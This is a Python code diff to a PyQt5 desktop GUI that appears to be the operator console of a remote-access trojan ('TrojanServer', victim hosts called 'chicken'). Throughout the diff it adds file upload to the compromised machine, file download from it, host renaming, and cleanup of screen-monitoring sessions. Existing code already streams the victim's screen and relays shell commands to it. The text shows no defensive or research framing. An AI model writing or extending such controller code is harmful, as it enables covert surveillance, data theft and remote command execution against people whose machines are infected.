@@ -8,7 +8,7 @@ from PIL.Image import frombytes
 from PyQt5 import QtWidgets
 from PyQt5.QtCore import pyqtSignal, Qt, QSize
 from PyQt5.QtGui import QPixmap
-from PyQt5.QtWidgets import QWidget, QApplication, QListWidgetItem, QHBoxLayout, QLabel
+from PyQt5.QtWidgets import QWidget, QApplication, QListWidgetItem, QHBoxLayout, QLabel, QFileDialog, QMessageBox
 
 from Detail import Ui_Form
 from server import TrojanServer, Chienken
@@ -24,6 +24,7 @@ class DetailMain(QWidget, Ui_Form):
     consoleSignal = pyqtSignal(str)
     listSignal = pyqtSignal(list)
     pwdSignal = pyqtSignal(str)
+    fileSignal = pyqtSignal(bytes)
 
     def __init__(self, trojanserver=None, ck=0):
         super().__init__()
@@ -48,6 +49,9 @@ class DetailMain(QWidget, Ui_Form):
             if addr[0] == self.chicken.ip:
                 self.connectsignal.emit()
                 break
+
+    def rename(self):
+        self.trojanServer.cmdQ.put("rename %d %s" %(self.ck, self.newname_input.text()))
 
     def connected(self):
         self.enableReiceive = True
@@ -89,18 +93,10 @@ class DetailMain(QWidget, Ui_Form):
                     lens = struct.unpack('i', len_struct)[0]
                     body = self.socket.recv(lens)
                     ty = body.decode('utf8')
-                    print("000")
                     if ty == "pic":
-                        print("ds")
                         d = self.socket.recv(12)
-                        print(d)
-                        print(len(d))
                         data = struct.unpack('iii', d)
-                        print(data)
                         width, height, pic_len = data
-                        # len_struct = self.socket.recv(4)
-                        # pic_len = struct.unpack('i', len_struct)[0]
-                        body = None
                         body = self.tcpPieceRecv(pic_len, self.socket, 1024)
                         try:
                             im = frombytes(data=body, size=(width, height), mode="RGB", decoder_name='raw')
@@ -118,6 +114,10 @@ class DetailMain(QWidget, Ui_Form):
                         data['list'] = data['list'][:300]
                         self.listSignal.emit(data['list'])
                         self.pwdSignal.emit(data['pwd'])
+                    elif ty == 'file':
+                        size = struct.unpack('i', self.socket.recv(4))[0]
+                        data = self.tcpPieceRecv(size, self.socket, 1024)
+                        self.fileSignal.emit(data)
             except:
                 pass
         print("线程退出成功")
@@ -125,7 +125,6 @@ class DetailMain(QWidget, Ui_Form):
 
     def disconnected(self):
         self.enableReiceive = False
-        self.trojanServer.cmdQ.put("msg %d disconnect" % self.ck)
         if self.socket:
             self.socket.close()
         self.infostatus.setText("未连接")
@@ -153,6 +152,22 @@ class DetailMain(QWidget, Ui_Form):
         self.console.append(content)
         self.console.moveCursor(self.console.textCursor().End)
 
+    def upload(self):
+        filename, fileType = QtWidgets.QFileDialog.getOpenFileName(self, "选取文件", os.getcwd(),
+                                                                   "All Files(*);")
+        print(filename)
+        single_name = os.path.basename(filename)
+        length = os.path.getsize(filename)
+        cmd = "msg %d upload %s %d" % (self.ck, single_name, length)
+        self.console.append("$: %s" % cmd)
+        self.trojanServer.cmdQ.put(cmd)
+        with open(filename, 'rb') as file:
+            while True:
+                data = file.read(1024)
+                if not data:
+                    break
+                self.tcpPieceSend(data, self.socket, 1024)
+
     def consoleDisplay(self):
         cmd = self.console_input.text()
         self.console_input.clear()
@@ -162,25 +177,17 @@ class DetailMain(QWidget, Ui_Form):
         elif cmd == "restart":
             self.disconnected()
         elif cmd == "upload":
-            filename, fileType = QtWidgets.QFileDialog.getOpenFileName(self, "选取文件", os.getcwd(),
-                                                                       "All Files(*);")
-            print(filename)
-            single_name = os.path.basename(filename)
-            length = os.path.getsize(filename)
-            cmd = "msg %d upload %s %d" % (self.ck, single_name, length)
-            self.console.append("$: %s" % cmd)
-            self.trojanServer.cmdQ.put(cmd)
-            with open(filename, 'rb') as file:
-                while True:
-                    data = file.read(1024)
-                    if not data:
-                        break
-                    self.tcpPieceSend(data, self.socket, 1024)
-
+            self.upload()
         else:
             cmd = "msg %d dos %s" % (self.ck, cmd)
             self.console.append("$: %s" % cmd)
             self.trojanServer.cmdQ.put(cmd)
+
+    def closeEvent(self, event):
+        self.startpic.setText("开启屏幕监控")
+        self.trojanServer.cmdQ.put("msg %d picstop" % self.ck)
+        self.trojanServer.cmdQ.put("msg %d disconnect" % self.ck)
+        self.disconnected()
 
     def displayList(self, flist):
         self.listWidget.clear()
@@ -209,11 +216,28 @@ class DetailMain(QWidget, Ui_Form):
             widget = getWidget(f[0], f[1])
             self.listWidget.setItemWidget(item, widget)
 
+    def saveFile(self, data):
+        file_name, type = QFileDialog.getSaveFileName(self, 'save file', os.getcwd(), "ALL (*)")
+        if file_name:
+            with open(file_name, 'wb') as file:
+                file.write(data)
+                print("传输完成")
+
+
     def enterDir(self, item:QListWidgetItem = None):
         widget = self.listWidget.itemWidget(item)
         name = widget.namelabel.text()
         if widget.isDir:
             self.trojanServer.cmdQ.put("msg %d dos cd %s" %(self.ck, name))
+        else:
+            reply = QMessageBox.question(self, 'Message', '下载%s?'%name,
+                                         QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+
+            if reply == QMessageBox.Yes:
+                self.trojanServer.cmdQ.put("msg %d getFile %s"%(self.ck, name))
+            else:
+                pass
+
 
     def picWatch(self):
         status = self.startpic.text()
@@ -243,7 +267,9 @@ class DetailMain(QWidget, Ui_Form):
         self.remotewidth.valueChanged.connect(self.remoteWidthChange)
         self.localwidth.valueChanged.connect(self.localWidthChange)
         self.restartbutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos restart" % self.ck))
-
+        self.rename_button.clicked.connect(self.rename)
+        self.uploadbutton.clicked.connect(self.upload)
+        self.fileSignal.connect(self.saveFile)
 
 if __name__ == '__main__':
     tro = TrojanServer()
